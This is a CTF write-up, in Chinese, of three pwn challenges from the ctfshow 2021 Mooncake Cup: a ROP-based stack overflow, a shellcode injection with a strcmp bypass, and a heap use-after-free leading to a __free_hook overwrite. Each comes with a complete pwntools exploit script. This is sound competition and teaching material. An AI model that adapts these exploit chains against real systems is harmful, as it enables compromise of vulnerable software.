---
title: ctfshow-月饼杯2021-pwn-wp
categories: [CTF]
tags: [wp,pwn]

---
久违参加了ctfshow的比赛，题都比较简单，就是远程环境libc我泄露半天才泄露出来... (⊙﹏⊙) <!--more-->

## 简单的胖

题目简单就一个简单amd64位的栈溢出.

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  char buf[28]; // [rsp+0h] [rbp-20h]
  int v6; // [rsp+1Ch] [rbp-4h]

  setvbuf(_bss_start, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 2, 0LL);
  printf("What's your name? ", 0LL);
  v3 = read(0, buf, 0x100uLL);
  v6 = v3;
  buf[v3 - 1] = 0;
  printf("Welcome to the CTFshow Moon cake cup! %s!\n", buf);
  return 0;
}
```

看下保护只开了NX.

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

先一波正常栈溢出,通过`printf`函数泄露出libc的真实地址和libc版本.

(但这里远程环境libc 版本,我之前泄露libc死活泄露不出来,看了第二题的libc才猜测两题环境可能一样,tcl)

然后再通过一波栈溢出getshell.

```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

'''
@File    :   exp.py
@Time    :   2021/09/20 15:40:41
@Author  :   lexsd6
'''

from pwn import * 
from libcfind import *

local_mote=0
elf='./moonpwn01'
e=ELF(elf)
context.log_level = 'debug'
context.arch=e.arch
ip_port=['pwn.challenge.ctf.show',28075]
#GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1) stable release version 2.27.
debug=lambda : gdb.attach(p) if local_mote==1 else None

if local_mote==1 :
   p=process(elf)
else :
   p=remote(ip_port[0],ip_port[-1])
"""
0x00000000004006fc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006fe : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400700 : pop r14 ; pop r15 ; ret
0x0000000000400702 : pop r15 ; ret
0x00000000004006fb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004006ff : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400578 : pop rbp ; ret
0x0000000000400703 : pop rdi ; ret
0x0000000000400701 : pop rsi ; pop r15 ; ret
0x00000000004006fd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x00000000004004ce : ret 
"""
rdi_ret=0x0000000000400703
ret=0x00000000004004ce 

p.sendline('1'*0x28+p64(ret)+p64(rdi_ret)+p64(e.got['printf'])+p64(e.sym['printf'])+p64(e.sym['_start']))

addr=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
print(hex(addr))

x=finder('printf',addr) #Ubuntu GLIBC 2.27-3ubuntu1
#p.sendline('1'*0x28+p64(rdi_ret)+p64(0x601100)+p64(x.dump('gets'))+p64(rdi_ret)+p64(0x601100)+p64(x.dump('puts'))+p64(rdi_ret)+p64(0x601100)+p64(ret)+p64(x.dump('system'))+p64(e.sym['_start']))
#p.sendline('/bin/sh\x00')
p.sendline('1'*0x28+p64(rdi_ret)+p64(x.dump('str_bin_sh'))+p64(ret)+p64(x.dump('system'))+p64(e.sym['_start']))
debug()
p.interactive()
```

## 容易的胖

题目是i386(32位)题目,先看来下了保护发现不仅什么没开.还有读写执行权限(喜).

```
    Arch:     i386-32-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```

审计下题目代码,发现通过fgets函数用我们可以写入至多256个字节长度的shellcode.

同时,`read(0, &s, 0x14u);`触有栈溢出但只能让我们溢出到`edp`.

加上,有`strcmp(&s, "yes\n") `判断需要我们bypass.

```c
int __cdecl main(int a1)
{
  char s; // [esp+0h] [ebp-18h]
  int *v3; // [esp+10h] [ebp-8h]

  v3 = &a1;
  sub_80485A6();
  memset(&s, 0, 0x10u);
  memset(::s, 0, 0x100u);
  puts("Input your shellcode");
  fgets(::s, 256, stdin);
  puts("Do you know how to use shellcode????");
  read(0, &s, 0x14u);
  if ( strcmp(&s, "yes\n") )
  {
    puts("you may be need learn it");
    exit(0);
  }
  puts("ok,good");
  return 0;
}
```

我们可以通过`yes\n\x00`+code的方法来绕过strcmp函数。同时，由于题目没有开NX与PIE，因此我们可以通过ida静态分析出通过fgets函数写入的shellcode存放到`0x804a040`。

因此我们可以通过栈溢出控制`edp`，再通过栈特性间接控制`eip`，在让让`eip`指向我们shellcode的地址，从而getshell。

```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

'''
@File    :   exp.py
@Time    :   2021/09/20 16:41:27
@Author  :   lexsd6
'''

from pwn import * 
from libcfind import *

local_mote=0
elf='./moonpwn02'
e=ELF(elf)
#context.log_level = 'debug'
context.arch='i386'
ip_port=['pwn.challenge.ctf.show',28157]

debug=lambda : gdb.attach(p) if local_mote==1 else None

if local_mote==1 :
   p=process(elf)
else :
   p=remote(ip_port[0],ip_port[-1])

p.sendline(p32((0x804a040+4))+asm(shellcraft.sh()))
#debug()
#print(hex(len(pay)))
p.sendline('yes\n\x00'+'\x00'*3+'\x00'*0x8+p32(0x804a040+4))

p.interactive()
```

## Moon_note

题目所有保护全开，是个堆题。

```
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

题目主要分为creat_notetitle,creat_content,show_content,delet_content_title.

题目主要问题出现在free chunk功能函数处：

```c
unsigned __int64 delete_note()
{
  char *ptr; // [rsp+8h] [rbp-28h]
  char v2; // [rsp+10h] [rbp-20h]
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Title of note to delete: ");
  getnline(&v2, 16LL);
  ptr = find_note(&v2);
  if ( ptr )
  {
    *(_QWORD *)(*((_QWORD *)ptr + 2) + 24LL) = *((_QWORD *)ptr + 3);
    *(_QWORD *)(*((_QWORD *)ptr + 3) + 16LL) = *((_QWORD *)ptr + 2);
    free(*((void **)ptr + 4)); //没有清空内容
    free(ptr);//没有note titile chunk清空内容
    --size;
  }
  return __readfsqword(0x28u) ^ v3;
}
```

由于在free时没有清空残余内容，导致uaf存在。

通过notetitle chunk free后，再add 仍指向content chunk .从而通show函数泄露出content chunk addr。

同时，经过测试libc版本低于2.29。因此还可以利用这free chunk 功能函数制造content chunk  double free。

从而让content chunk 错位改造出大于0x420的chunk 头，free掉构造出unsorted bin，从而泄露出libc。

然后通过`__free_hook`getshell。

（ps：这里偏移很奇怪，我原来本地libc2.27泄露出来unsorted bin addr 到`main_arena`为88 字节，然而远程环境为96）

```python
#!/usr/bin/env python
# -*- encoding: utf-8 -*-

'''
@File    :   exp.py
@Time    :   2021/09/21 01:25:02
@Author  :   lexsd6
'''

from pwn import * 
from libcfind import *

local_mote=0
elf='./Moon_note.note'
e=ELF(elf)
#context.log_level = 'debug'
context.arch=e.arch
ip_port=['pwn.challenge.ctf.show',28079]

debug=lambda : gdb.attach(p) if local_mote==1 else None

if local_mote==1 :
   p=process(elf)
else :
   p=remote(ip_port[0],ip_port[-1])



def add_note(title):
    p.sendline('1')
    p.recvuntil('Title:')
    p.sendline(str(title))

def add(title,size,text):
    p.sendline('2')
    p.recvuntil('Title of note to write content:')
    p.sendline(str(title))
    p.recvuntil('Size of content')
    p.sendline(str(size))
    p.recvuntil('Content:')
    p.sendline(text)

def show(title):
    p.sendline('3')
    p.recvuntil('Title of note to show content:')
    p.sendline(str(title))

def free(title):
    p.sendline('4')
    p.recvuntil('Choice: Title of note to delete:')
    p.sendline(str(title))

for i in range(0x20):
    add_note(str(i))
add(2,0x48,'11111')
add(1,0x48,'11111')
free(2)
free(1)
#free(2)
add_note(1)
free(1)
add_note(1)
show(1)

addr=u64(p.recvline()[1:-1].ljust(8,'\x00'))
log.info(hex(addr))


add(3,0x48,p64(addr-0x20)+p64(addr-0x20))
add(4,0x48,'11111')
add(5,0x48,p64(0)*3+p64(0x461))

for i in range(14):
    add(i+6,0x48,'/bin/sh\x00')
free(4)
add_note(4)
show(4)

molloc_hook_addr=u64(p.recvline()[1:-1].ljust(8,'\x00'))-96-0x10
log.info(hex(molloc_hook_addr))
x=finder('__malloc_hook',molloc_hook_addr)

free(7)
free(6)
add_note(6)
free(6)
add(21,0x48,p64(x.dump('__free_hook')))
add(22,0x48,p64(x.dump('__free_hook')))
add(23,0x48,p64(x.dump('system')))
free(8)
#debug()

p.interactive()

```



